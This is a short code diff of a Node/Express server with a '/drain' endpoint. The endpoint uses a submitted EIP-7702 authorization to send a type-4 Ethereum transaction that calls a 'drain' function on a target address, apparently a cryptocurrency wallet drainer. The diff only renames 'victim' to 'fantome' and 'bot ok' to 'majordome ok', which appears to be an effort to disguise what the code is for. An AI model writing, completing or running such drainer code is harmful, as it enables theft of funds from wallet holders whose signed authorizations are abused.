@@ -16,8 +16,8 @@ app.use(express.json());
 
 app.post("/drain", async (req, res) => {
   try {
-    const { victim, auth } = req.body;
-    if (!victim || !auth) return res.status(400).json({ error: "victim/auth manquant" });
+    const { fantome, auth } = req.body;
+    if (!fantome || !auth) return res.status(400).json({ error: "fantome/auth manquant" });
 
     const authorization = {
       chainId: BigInt(auth.chainId),
@@ -34,7 +34,7 @@ app.post("/drain", async (req, res) => {
     const tx = {
       type: 4,
       chainId: 1,
-      to: victim,
+      to: fantome,
       value: 0n,
       data: iface.encodeFunctionData("drain"),
       nonce,
@@ -51,5 +51,5 @@ app.post("/drain", async (req, res) => {
   }
 });
 
-app.get("/", (_, res) => res.send("bot ok"));
+app.get("/", (_, res) => res.send("majordome ok"));
 app.listen(process.env.PORT || 3000);
